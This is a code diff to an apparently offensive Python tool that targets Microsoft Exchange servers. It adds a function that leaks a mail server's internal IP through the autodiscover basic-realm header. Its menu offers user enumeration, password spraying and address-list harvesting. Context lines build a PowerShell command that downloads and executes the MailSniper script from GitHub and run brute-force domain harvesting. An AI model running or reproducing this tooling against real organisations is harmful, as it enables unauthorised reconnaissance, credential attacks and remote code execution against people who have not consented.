@@ -1,7 +1,7 @@
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
-import time, getpass, re, os, signal, sys, zipfile, urllib.request
+import time, getpass, re, os, signal, sys, zipfile, urllib.request, socket
 
 def signal_handler(sig, frame):
     print('You pressed Ctrl+C!')
@@ -134,6 +134,20 @@ def get_employees(username, password, company_id):
     print("Script finished his execution.")
     clean_users(result)
 
+def internalIP(server):
+    IP = socket.gethostbyname(server)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, 80))
+    s.sendall(b'GET /autodiscover/autodiscover.xml HTTP/1.0 \r\n\r\n')
+    data = s.recv(1024)
+    s.close()
+    for x in data.decode("utf-8").split("\r\n"):
+        if "basic realm" in x.lower():
+            print("Found the internal IP:", x.split('"')[1])
+            return
+    
+    print("Mail server not vulnerable!")
+
 def mailsniper_internaldomain(server, company_name):
     command = 'PowerShell.exe -c "IEX (New-Object Net.WebClient).DownloadString("""https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1"""); Invoke-DomainHarvestOWA -ExchHostname ' + server + '; Invoke-DomainHarvestOWA -ExchHostname ' + server + ' -CompanyName \'' + company_name + '\' -Brute"'
     print(command)
@@ -243,6 +257,7 @@ try:
     print("5- Start users enumeration process.")
     print("6- Start password spraying attack.")
     print("7- Get employees global address list.")
+    print("8- Get the mail server internal IP.")
     
     choice = input("Please enter your choice: ")
     
@@ -299,7 +314,7 @@ try:
         
         mailsniper_passwordspray(server, valid_password, "modified_address_list.txt", "full_valid_passwords.txt")
     
-    if choice == "1":
+    elif choice == "1":
         print("Enter your linkedin information...")
         username = input('Enter your email: ')
         password = getpass.getpass('Enter your password: ')
@@ -366,6 +381,10 @@ try:
 
         print("Exec modify address list.")
         modify_address_list(internal_domain)
+    
+    elif choice == "8":
+        server = input('Enter the company exchange server domain: ')
+        internalIP(server)
     
     else:
         print("Unrecognized option !!!")
